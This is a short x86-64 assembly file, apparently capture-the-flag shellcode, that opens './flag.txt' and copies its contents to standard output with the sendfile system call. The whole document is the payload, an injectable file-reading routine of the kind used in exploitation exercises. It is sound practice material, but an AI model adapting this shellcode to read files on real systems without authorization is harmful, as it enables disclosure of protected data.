.global _start

_start:
.intel_syntax noprefix
  lea rdi, [rip+flagfile]
  xor rsi, rsi
  xor rdx, rdx
  mov rax, 0x2
  syscall
  mov rsi, rax
  mov rdi, 0x1
  mov rdx, 0x0
  mov r10, 0x100
  mov rax, 40
  syscall

flagfile: 
  .string "./flag.txt"
